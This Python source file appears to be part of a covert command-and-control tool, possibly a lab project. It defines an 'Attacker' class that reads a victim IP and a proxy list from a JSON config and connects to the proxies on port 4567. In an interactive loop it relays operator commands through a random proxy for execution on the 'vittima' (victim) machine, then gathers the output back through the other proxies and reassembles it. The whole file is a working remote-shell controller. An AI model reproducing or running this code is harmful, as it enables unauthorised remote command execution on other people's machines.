#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import datetime 
import time
import ipaddress
import sys 
import os 
import argparse 
import re 
import random
import threading
from functools import partial 
import json
import type_singleton as singleton
import socket

file_path = "../comunication_methods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import comunication_methods as com

file_path = "../mymethods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import mymethods 

file_path = "./attacksingleton.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import attacksingleton 



#-----------------------------------------

def separa_dati_byID(received_data:dict[str,list], dati_separati:dict[str,list]):
    unindent_data=[]
    ## dati_separati={id:lista}
    for list_data in received_data.values():
        for data in list_data:
            if isinstance(data, bytes):
                data=data.decode()
            if isinstance(data, str):
                data=data.split("||")
            else: print(type(data))
            #print("Separa: ",data) 
            unindent_data.append([x for x in data])
    #print("unindent_data: ",unindent_data)    
    for list_data in unindent_data:
        #print("list_data: ",list_data)
        #print(f"\t***{list_data}")
        for index in range(len(list_data)):
            #print(f"AAAA: {index}/{len(list_data)}")
            if not list_data[index]: 
                continue
            #print(f"\t***{list_data[index]}") 
            if isinstance(list_data[index],bytes):
                data=list_data[index].decode()
            if isinstance(list_data[index],str): 
                data=list_data[index].split("\t")
            #print("***DATA: ",data) 
            if dati_separati.get(data[1]) is None:
                dati_separati.update({data[1]:[]}) 
            dati_separati.get(data[1]).append(data)   

def unisciDati(dati_separati:dict[str:list]):
    payload=[] 
    for index in range(len(dati_separati)): 
        #print("DATI: ",dati_separati.get(str(index))) 
        for data in dati_separati.get(str(index)):
            if data[2]==com.LAST_PACKET:
                continue
            payload.append(data[2])
    return payload

#----------------------------------------- 
def reset_event_update_foreach_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[],event_proxy_update:dict={}):
    try:
        if not com.is_list(proxy_list) or len(proxy_list)<=0:
            raise ValueError(f"proxy_list non è una lista o è vuota: {proxy_list}")
        if not com.is_dictionary(event_proxy_update):
            raise ValueError(f"La lista degli eventi non è un dizionmario: {event_proxy_update}")
    except Exception as e:
        raise Exception(f"reset_event_update_foreach_proxy: {e}") 
    for proxy in proxy_list:
        event_proxy_update.get(proxy.compressed).clear() 

def restart_thread(thread_list:dict[str:threading.Thread]): 
    for thread in thread_list.values():
        thread.start()


def create_event_update_foreach_proxy(proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]):
    try:
        if not com.is_list(proxy_list) or len(proxy_list)<=0:
            raise ValueError(f"proxy_list non è una lista o è vuota: {proxy_list}")
    except Exception as e:
        raise Exception(f"create_event_update_foreach_proxy: {e}")
    event_proxy_update={}
    for proxy in proxy_list:
        event_proxy_update.update({proxy.compressed:com.get_threading_Event()})    
    reset_event_update_foreach_proxy(proxy_list, event_proxy_update)
    #print(f"Eventi creati:\t{event_proxy_update}")
    print("Per ogni proxy creato il proprio evento di aggiornamento 'proxy_update'")
    return event_proxy_update 

#-----------------------------------------
def elimina_proxy_nonconnessi(thread_lock:threading.Lock=None, thread_response:dict=None, proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]):
    try:
        com.is_threading_lock(thread_lock) 
        com.is_dictionary(thread_response) 
        if not com.is_list(proxy_list) or len(proxy_list)<=0: 
            raise ValueError("elimina_proxy_nonconnessi: lista proxy non valida")
    except Exception as e:
        raise Exception(f"elimina_proxy_nonconnessi: {e}")
    thread_lock.acquire() 
    proxy_response=thread_response.items()
    thread_lock.release()   
    for proxy,value in proxy_response: 
        try: 
            if not value: 
                proxy_list.remove(ipaddress.ip_address(proxy)) 
        except Exception as e:
            print(f"check_available_proxies: {proxy} not present in list. {e}")

def get_connected_proxy(proxy_list:list[ipaddress.IPv4Address], ip_vittima:ipaddress.IPv4Address, callback_function, dict_proxy_socket:dict, thread_list:dict[str,threading.Thread], attack_function:dict):
    #unconnected_proxy:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[] 
    for proxy in proxy_list.copy(): 
        #basic_socket
        #with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as socket_4_proxy:
        try: 
            socket_proxy=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_proxy.connect((proxy.compressed, 4567)) #("192.168.56.104", 4567)
            #print(f"Socket: {socket_4_proxy}")
        except Exception as e:
            print(f"Socket {proxy} get_connected_proxy: {e}")
            socket_proxy.close() 
            proxy_list.pop(proxy_list.index(proxy))
            continue 
        data=(com.CONFIRM_ATTACKER+ip_vittima.compressed+"||"+com.ATTACK_FUNCTION+next(iter(attack_function.items()))[0])
        socket_proxy.sendall(data.encode())

        data=socket_proxy.recv(1024).decode()
        print(f"Socket {proxy} Received: {data}") 
        if not data or data!=(com.CONFIRM_PROXY+ip_vittima.compressed+proxy.compressed):
            print(f"Close connection for {proxy}")  
            socket_proxy.sendall(com.END_COMMUNICATION.encode())
            socket_proxy.close()
            proxy_list.pop(proxy_list.index(proxy)) 
            continue
        #print(f"\t{proxy} is an available proxy")
        dict_proxy_socket.update({proxy.compressed:socket_proxy})
        thread=threading.Thread(
            target= callback_function #wait_proxy_update
            ,args=[proxy]
        ) 
        thread_list.update({proxy.compressed:thread})
        thread.start() 
    
#----------------------------------------- 
def set_proxy_list(config_file):
    proxy_list:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]
    for dict_proxy in config_file.get("proxy_list", []):
        if not isinstance(dict_proxy, dict):
            print(f"proxy is not dict: {dict_proxy}")
            continue 
        for value in dict_proxy.values(): 
            try:
                proxy_ip=ipaddress.ip_address(value)
                proxy_list.append(proxy_ip)  
            except Exception as e:
                print(f"\tset_proxy_list: {e}") 
    print(f"Lista proxy sanificata")
    return proxy_list

def setIP_host():
        ip, errore=mymethods.find_local_IP() 
        if ip is None:
            ip="192.168.56.104"
        ip_host=ipaddress.ip_address(ip)        
        if not isinstance(ip_host, ipaddress.IPv4Address) and not isinstance(ip_host, ipaddress.IPv6Address):
            #print(f"Coulnd't get ip: {errore}") if ip_host is None else print(ip_host)
            raise ValueError(f"L'indirizzo IP del host non è valido: {ip_host}:{errore}") 
        return ip_host

def setIP_vittima(config_file):
        ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))  
        if ip_vittima is None or not (isinstance(ip_vittima, ipaddress.IPv4Address) or isinstance(ip_vittima, ipaddress.IPv6Address)):
            raise ValueError(f"L'indirizzo IP della vittima non è valido: {ip_vittima}") 
        return ip_vittima

def attack_type(json_file): 
        attack_function = attacksingleton.AttackType().get_attack_function(json_file.get("attack_function"))
        if not isinstance(attack_function, dict) or len(attack_function.items())!=1:
            print(f"Funzione di attacco non definita ",
                f"non è un dizionario ma {type(attack_function)}" if not isinstance(attack_function, dict) 
                else f"funzioni ricavate {len(attack_function.items())}" if len(attack_function.items())!=1
                else None
            )
            attack_function=attacksingleton.choose_attack_function() 
        return attack_function

def load_config_file(default_file_path, path_of_file): 
        if not os.path.exists(path_of_file) or not str(path_of_file).endswith(".json"):
            if os.path.exists(default_file_path):
                print(f"\tFile di configurazione {file_path}  non trovato, si usa quello di default")
                path_of_file=default_file_path
            else: 
                raise FileNotFoundError(f"I file {path_of_file} e {default_file_path} non esistono")
        with open(path_of_file, 'r') as file: 
            print(f"File di configurazione {path_of_file} caricato correttamente") 
            return json.load(file) 

def check_value_in_parser(args):
    if not isinstance(args,argparse.Namespace): 
        raise Exception(f"Argomento parser non è istanza di argparse.Namespace")  
    if not isinstance(args.file_path,str):
        raise Exception(f"--file_path non specificato: {args.file_path}") 
    return True

def get_args_from_parser(): 
    parser = argparse.ArgumentParser()
    parser.add_argument("--file_path",type=str, help="File di configurazione")  
    try:
        args, unknown =mymethods.check_for_unknown_args(parser)  
        if len(unknown) > 0: 
            raise Exception(f"Argomenti sconosciuti: {unknown}") 
        if check_value_in_parser(args):  
            return args
    except Exception as e:
        mymethods.print_parser_supported_arguments(parser)
        raise Exception(f"get_args_from_parser: {e}") 

#-----------------------------------------  
class Attacker:
    default_file_path:str = "./attack_file.json" 
    
    def __init__(self): 
        try:
            args=get_args_from_parser() 
            dict_values={
                "file_path":args.file_path  
            }
            config_file=load_config_file(self.default_file_path, dict_values.get("file_path"))
        except Exception as e: 
            print(f"__init__ load file: {e}", file=sys.stderr)
            exit(1) 
        try:
            self.attack_function=attack_type(config_file)  
            print(f"Attacco selezionato: {self.attack_function}") 
            self.ip_vittima=setIP_vittima(config_file) 
            print(f"IP vittima valido: {type(self.ip_vittima) } {self.ip_vittima }")
            self.ip_host=setIP_host()
            print(f"IP host valido: {type(self.ip_host)} {self.ip_host}")
            self.proxy_list=set_proxy_list(config_file)  

            self.received_data:dict[str,list]={}
            for proxy in self.proxy_list:
                self.received_data.update({proxy.compressed:[]}) 
            self.dati_separati={}
        except Exception as e:
            print(f"__init__ main variable: {e}", file=sys.stderr)
            exit(1)  
        
        try:
            self.dict_proxy_socket:dict[str,socket.socket]={} 
            self.thread_list:dict[str,threading.Thread]={} 
            get_connected_proxy(
                self.proxy_list, self.ip_vittima, self.wait_proxy_update, 
                self.dict_proxy_socket, self.thread_list, self.attack_function
            )  
            print(f"Got all connected proxy") 
            if len(self.proxy_list)<=0:
                raise Exception(f"Nessun proxy disponibile: {len(self.proxy_list)}")
            
            for thread in self.thread_list.values():
                thread.join() 
            print("Thread all done")
        except Exception as e:
            print(f"__init__ connected proxy: {e}", file=sys.stderr)
            exit(1)  
        
        try: 
            
            self.send_command_to_victim() 
        except Exception as e:
            print(f"__init__ send command: {e}") 
            exit(0) 
        
    def wait_proxy_update(self, proxy:ipaddress.IPv4Address|ipaddress.IPv6Address): 
        #print("\n\t(＾▽＾)\tattacker_wait_proxy_update\n") 
        try: 
            if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
                raise Exception(f"Indirizzo IP vittima non è ne un IPv4Address ne un IPv6Address: {proxy}") 
        except Exception as e:
            print(f"attacker_wait_proxy_update: {e}")
            return None
        
        try:
            proxy_socket=self.dict_proxy_socket.get(proxy.compressed)
            confirm_text=com.CONFIRM_VICTIM + self.ip_vittima.compressed+proxy.compressed  
            data_received=proxy_socket.recv(1024).decode()
            if confirm_text in data_received: 
                result=data_received.replace(confirm_text,"")
                print(f"{proxy} è connesso alla vittima? {type(result)} {result}")
                if result!="True":
                    print(f"Proxy {proxy} non connesso alla vittima")
                    self.dict_proxy_socket.pop(proxy.compressed)
                    proxy_socket.close()  
                    self.proxy_list.pop(self.proxy_list.index(proxy)) 
                    return False 
            print(f"Proxy {proxy} connesso alla vittima")
            return True
        except Exception as e:
            print(f"wait_proxy_update: {e}")
            return False 
    
    def send_command_to_victim(self): 
        self.data_lock=threading.Lock()
        self.event_thread_update=create_event_update_foreach_proxy(self.proxy_list) 
        self.thread_lock,self.thread_proxy_response,self.thread_list=com.setup_thread_foreach_address(
            self.proxy_list, self.wait_data_from_proxy
        )
        self.event_received_data=com.get_threading_Event()
        print("Attivo i thread per ricevere i dati") 
        for thread in self.thread_list.values():
            thread.start()
        
        msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
        command=input(msg) 
        while command.lower() not in com.exit_cases: 
            print(f"Il comando immesso è: {command}")
            try:
                chosen_proxy=random.choice(self.proxy_list)
                #print(f"Il proxy scelto è: {chosen_proxy}")
            except Exception as e:
                print(f"send_command_to_victim: {e}") 
                continue
            print(f"Il comando {command} verrà mandato al proxy {chosen_proxy}") 
            socket= self.dict_proxy_socket.get(chosen_proxy.compressed)
            data=(com.CONFIRM_COMMAND+command)
            socket.sendall(data.encode())
            print(f"Gli altri proxy ascolteranno direttamente la vititma")
            for proxy in self.proxy_list:
                if proxy!=chosen_proxy :
                    socket= self.dict_proxy_socket.get(proxy.compressed)
                    socket.sendall(com.WAIT_DATA.encode())  
            
            for thread in self.thread_list.values(): 
                thread.join()  
            

            print("Separazione dati per SEQ") 
            try:
                print("ABCDEFG: ",self.received_data)
                separa_dati_byID(self.received_data, self.dati_separati) 
                print("ABCDEFG: ",self.dati_separati)
            except Exception as e:
                print(f"send_command_to_victim separa: {e}")
            #print("\n***dati_separati: ", self.dati_separati) 
            print("Dati separati per Sequenza")   
            try:
                payload=unisciDati(self.dati_separati)
                print(payload)
            except Exception as e:
                print("aiuto eccezzione: ",e) 
            
            #reset thread and reset received_data
            self.reset_variables()
            command=input(msg) 
        print("Uscita dalla shell\texit")  
        for proxy in self.proxy_list:
            socket_proxy=self.dict_proxy_socket.get(proxy.compressed)
            socket_proxy.sendall(com.END_COMMUNICATION.encode()) 
            socket_proxy.close()

    def wait_data_from_proxy(self,proxy:ipaddress.IPv4Address|ipaddress.IPv6Address):  
        print("wait_data_from_proxy")
        self.data_lock.acquire()
        proxy_data=self.received_data.get(proxy.compressed)
        self.data_lock.release()

        proxy_socket=self.dict_proxy_socket.get(proxy.compressed)
        #print("UUU: ",proxy_socket)
        while(data:=proxy_socket.recv(1024)): 
            #print(f"AAA:{proxy.compressed}: {data}",file=sys.stdout,flush=True)
            #print("proxy_data: ",proxy_data)
            self.data_lock.acquire() 
            proxy_data.append(data) 
            self.data_lock.release()
            #print("proxy_data: ",proxy_data)
            if com.LAST_PACKET.encode() in data:
                break
        print("Received all data") 
        return 
    
    def reset_variables(self):
        reset_event_update_foreach_proxy(self.proxy_list, self.event_thread_update) 
        self.thread_list={}
        self.dati_separati={}
        self.received_data:dict[str,list]={}
        for proxy in self.proxy_list: 
            if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
                print(f"***\t{proxy} non è un indirizzo valido")
                continue
            self.received_data.update({proxy.compressed:[]}) 
            thread=threading.Thread(
                target=self.wait_data_from_proxy 
                ,args=[proxy]
            )
            thread.name=f"Thread-{proxy.compressed}"
            self.thread_list.update({proxy.compressed:thread})
        for proxy in self.proxy_list:
            self.event_thread_update.get(proxy.compressed).clear() 
        restart_thread(self.thread_list) 

        #com.setup_thread_foreach_address(self.proxy_list, self.wait_data_from_proxy)
        
        #thread=threading.Thread(
        #    target= callback_function #wait_proxy_update
        #    ,args=[proxy]
        #) 
        #thread_list.update({proxy.compressed:thread})
        #thread.start() 
        
        #if want_to_choose_new_attack():
        #    self.attack_function=choose_new_attack() 
        #if want_to_choose_new_victim:
        #   self.ip_vittima= choose_new_victim() 
    
    

if __name__=="__main__": 
    Attacker()
    #Fare 2a parte
